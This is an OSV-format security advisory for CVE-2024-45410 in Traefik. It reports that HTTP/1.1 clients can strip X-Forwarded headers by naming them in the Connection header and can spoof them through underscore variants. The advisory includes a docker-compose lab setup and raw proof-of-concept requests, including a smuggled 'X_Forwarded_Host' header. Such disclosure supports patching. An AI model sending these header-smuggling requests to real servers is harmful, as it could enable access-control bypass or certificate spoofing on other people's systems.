{
  "modified": "2024-09-19T13:44:39Z",
  "published": "2024-09-19T13:44:39Z",
  "schema_version": "1.5.0",
  "id": "CVE-2024-45410",
  "aliases": [
    "GHSA-62c8-mh53-4cqv"
  ],
  "details": "### Impact\r\n\r\nThere is a vulnerability in Traefik that allows the client to remove the X-Forwarded headers (except the header X-Forwarded-For).\r\n\r\n### Patches\r\n\r\n- https://github.com/traefik/traefik/releases/tag/v2.11.9\r\n- https://github.com/traefik/traefik/releases/tag/v3.1.3\r\n\r\n### Workarounds\r\n\r\nNo workaround.\r\n\r\n### For more information\r\n\r\nIf you have any questions or comments about this advisory, please [open an issue](https://github.com/traefik/traefik/issues).\r\n\r\n\u003cdetails\u003e\r\n\u003csummary\u003eOriginal Description\u003c/summary\u003e\r\n### Summary\r\n\r\nWhen a HTTP request is processed by Traefik, certain HTTP headers such as X-Forwarded-Host or X-Forwarded-Port are added by Traefik before the request is routed to the application. For a HTTP client, it should not be possible to remove or modify these headers. Since the application trusts the value of these headers, security implications might arise, if they can be modified.\r\n\r\nFor HTTP/1.1, however, it was found that some of theses custom headers can indeed be removed and in certain cases manipulated. The attack relies on the HTTP/1.1 behavior, that headers can be defined as hop-by-hop via the HTTP Connection header. By setting the following connection header, the X-Forwarded-Host header can, for example, be removed:\r\n\r\nConnection: close, X-Forwarded-Host\r\n\r\nDepending on how the receiving application handles such cases, security implications may arise. Moreover, some application frameworks (e.g. Django) first transform the \"-\" to \"_\" signs, making it possible for the HTTP client to even modify these headers in these cases.\r\n\r\nThis is similar to [CVE-2022-31813](https://nvd.nist.gov/vuln/detail/CVE-2022-31813) for Apache HTTP Server.\r\n\r\n### Details\r\n\r\nIt was found that the following headers can be removed in this way (i.e. by specifing them within a connection header):\r\n\r\n- X-Forwarded-Host\r\n- X-Forwarded-Port\r\n- X-Forwarded-Proto\r\n- X-Forwarded-Server\r\n- X-Real-Ip\r\n- X-Forwarded-Tls-Client-Cert\r\n- X-Forwarded-Tls-Client-Cert-Info\r\n\r\n### PoC\r\n\r\nThe following docker-compose file has been used for a simple setup:\r\n\r\n```\r\nservices:\r\n  traefik:\r\n    image: traefik:v3.1\r\n    container_name: traefik\r\n    ports:\r\n      - \"443:443\"\r\n    volumes:\r\n      - /var/run/docker.sock:/var/run/docker.sock:ro\r\n      - ./traefik.yaml:/etc/traefik/traefik.yaml\r\n      - ./traefik-certs:/certs\r\n\r\n  python-http:\r\n    build:\r\n      context: .\r\n      dockerfile: Dockerfile\r\n    container_name: python-http\r\n    labels:\r\n      - \"traefik.enable=true\"\r\n      - \"traefik.http.routers.python-http.rule=Host(`python.example.com`)\"\r\n      - \"traefik.http.routers.python-http.entrypoints=websecure\"\r\n      - \"traefik.http.routers.python-http.tls=true\"\r\n      - \"traefik.http.services.python-http.loadbalancer.server.port=8080\"\r\n```\r\n\r\nThe following traefik.yaml has been used:\r\n\r\n```\r\nproviders:\r\n  docker:\r\n    exposedByDefault: false\r\n    watch: true\r\n  file:\r\n    fileName: /etc/traefik/traefik.yaml\r\n    watch: true\r\n\r\nentryPoints:\r\n  websecure:\r\n    address: \":443\"\r\n\r\ntls:\r\n  certificates:\r\n    - certFile: /certs/server-cert.pem\r\n      keyFile: /certs/server-key.pem\r\n```\r\n\r\nThe Python container just includes a simple Python HTTP server that prints the HTTP headers it receives. Here is the Dockerfile for the container:\r\n\r\n```\r\nFROM python:3-alpine\r\n\r\n# Copy the Python script to the container\r\nCOPY server.py /server.py\r\n\r\n# Set the working directory\r\nWORKDIR /\r\n\r\n# Command to run the Python server\r\nCMD [\"python\", \"/server.py\"]\r\n```\r\n\r\nAnd here is the Python script:\r\n\r\n```\r\nfrom http.server import BaseHTTPRequestHandler, HTTPServer\r\n\r\nclass RequestHandler(BaseHTTPRequestHandler):\r\n    def _send_response(self):\r\n        self.send_response(200)\r\n        self.send_header(\"Content-type\", \"text/plain\")\r\n        self.end_headers()\r\n        self.wfile.write(str(self.headers).encode(\"utf-8\"))\r\n\r\n    def do_GET(self):\r\n        self._send_response()\r\n\r\nif __name__ == \"__main__\":\r\n    server = HTTPServer(('0.0.0.0', 8080), RequestHandler)\r\n    print(\"Server started on port 8080\")\r\n    server.serve_forever()\r\n````\r\n\r\nThe environment is run with `sudo docker-compose up`.\r\n\r\nA normal HTTP request/response pair looks like this:\r\n\r\n**Request 1**\r\n\r\n````\r\nGET / HTTP/1.1\r\nHost: python.example.com\r\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\r\nAccept-Encoding: gzip, deflate, br\r\nAccept-Language: de-DE,de;q=0.9,en-US;q=0.8,en;q=0.7\r\nPriority: u=0, i\r\nConnection: close\r\n````\r\n\r\n**Response 1**\r\n\r\n````\r\nHTTP/1.1 200 OK\r\nContent-Type: text/plain\r\nDate: Tue, 03 Sep 2024 06:53:49 GMT\r\nServer: BaseHTTP/0.6 Python/3.12.5\r\nConnection: close\r\nContent-Length: 556\r\n\r\nHost: python.example.com\r\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\r\nAccept-Encoding: gzip, deflate, br\r\nAccept-Language: de-DE,de;q=0.9,en-US;q=0.8,en;q=0.7\r\nPriority: u=0, i\r\nX-Forwarded-For: 172.20.0.1\r\nX-Forwarded-Host: python.example.com\r\nX-Forwarded-Port: 443\r\nX-Forwarded-Proto: https\r\nX-Forwarded-Server: 3138fe4f0a2e\r\nX-Real-Ip: 172.20.0.1\r\n````\r\n\r\nThe custom headers added by Traefik can be seen in the response.\r\n\r\nNext, a request, where the X-Forwarded-Host header is defined as a hop-by-hop header via the Connection header is sent:\r\n\r\n**Request 2**\r\n\r\n````\r\nGET / HTTP/1.1\r\nHost: python.example.com\r\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\r\nAccept-Encoding: gzip, deflate, br\r\nAccept-Language: de-DE,de;q=0.9,en-US;q=0.8,en;q=0.7\r\nPriority: u=0, i\r\nConnection: close, X-Forwarded-Host\r\n````\r\n\r\n**Response 2**\r\n\r\n````\r\nHost: python.example.com\r\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\r\nAccept-Encoding: gzip, deflate, br\r\nAccept-Language: de-DE,de;q=0.9,en-US;q=0.8,en;q=0.7\r\nPriority: u=0, i\r\nX-Forwarded-For: 172.20.0.1\r\nX-Forwarded-Port: 443\r\nX-Forwarded-Proto: https\r\nX-Forwarded-Server: 3138fe4f0a2e\r\nX-Real-Ip: 172.20.0.1\r\n````\r\n\r\nAs can be seen from the response, the X-Forwarded-Host header that had been added by Traefik has been removed from the request.\r\n\r\nMoreover, the next request/response pair demonstrates that a custom header with underscore instead of hyphen can be added:\r\n\r\n**Request 3**\r\n\r\n````\r\nGET / HTTP/1.1\r\nHost: python.example.com\r\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\r\nAccept-Encoding: gzip, deflate, br\r\nAccept-Language: de-DE,de;q=0.9,en-US;q=0.8,en;q=0.7\r\nPriority: u=0, i\r\nX_Forwarded_Host: myhost\r\nConnection: close, X-Forwarded-Host\r\n````\r\n\r\n**Response 3**\r\n\r\n````\r\nHTTP/1.1 200 OK\r\nContent-Type: text/plain\r\nDate: Tue, 03 Sep 2024 06:54:48 GMT\r\nServer: BaseHTTP/0.6 Python/3.12.5\r\nConnection: close\r\nContent-Length: 544\r\n\r\nHost: python.example.com\r\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\r\nAccept-Encoding: gzip, deflate, br\r\nAccept-Language: de-DE,de;q=0.9,en-US;q=0.8,en;q=0.7\r\nPriority: u=0, i\r\nX-Forwarded-For: 172.20.0.1\r\nX-Forwarded-Port: 443\r\nX-Forwarded-Proto: https\r\nX-Forwarded-Server: 3138fe4f0a2e\r\nX-Real-Ip: 172.20.0.1\r\nX_forwarded_host: myhost\r\n````\r\n\r\nSome backend frameworks (e.g. Django) handle X-Forwarded-Host and X_forwarded_host in the same way. As there is no X-Forwarded-Host header present in the request, the X_forwarded_host header will be used. \r\n\r\nIt should be noted that when X-Forwarded-Host is present and a X_forwarded_host header is sent, usually the first occurence of the header will be used, which is in this case X-Forwarded-Host.\r\n\r\nIt should be noted that the headers X-Forwarded-Tls-Client-Cert and X-Forwarded-Tls-Client-Cert-Info are also affected. Here, client certificate authentication would need to be enabled in the Traefik setup.\r\n\r\n### Impact\r\n\r\nAll applications that trust the custom headers set by Traefik are affected by this vulnerability. As an example, assume that a backend application trusts Traefik to validate client certificates and trusts therefore the values that are sent within the X-Forwarded-Tls-Client-Cert header, but does not validate the certificate anew.\r\n\r\nIf the header is removed via the vulnerability, and the application framework allows for alternative names (e.g. by transforming the headers to lower case, and \"-\" to \"_\"), an attacker can place his own X_Forwarded_TLS_Client_Cert header in the request. This could lead to privilege escalation, as the attacker may put an (invalid) certificate in this header that would just be accepted by the application, but may contain other data than the certificate that is presented to Traefik for Client Certificate Authentication.\r\n\r\nMoreover, if the backend application uses any of the other custom headers for security-sensitive operations, the removal or modification of these headers may also security implications (e.g. access control bypass).\r\n\r\nThe severity is the same as for [CVE-2022-31813](https://nvd.nist.gov/vuln/detail/CVE-2022-31813) for Apache HTTP Server, i.e. 9.8 Critical.\r\n\u003c/details\u003e",
  "affected": [
    {
      "package": {
        "ecosystem": "DHI",
        "name": "traefik",
        "purl": "pkg:dhi/traefik"
      },
      "ranges": [
        {
          "type": "SEMVER",
          "events": [
            {
              "introduced": "0"
            },
            {
              "fixed": "2.11.9"
            },
            {
              "introduced": "3.0.0"
            },
            {
              "fixed": "3.1.3"
            }
          ]
        }
      ],
      "database_specific": {
        "source_ecosystem": "go",
        "source_package": "Traefik"
      }
    }
  ],
  "references": [
    {
      "type": "WEB",
      "url": "https://github.com/traefik/traefik/security/advisories/GHSA-62c8-mh53-4cqv"
    }
  ]
}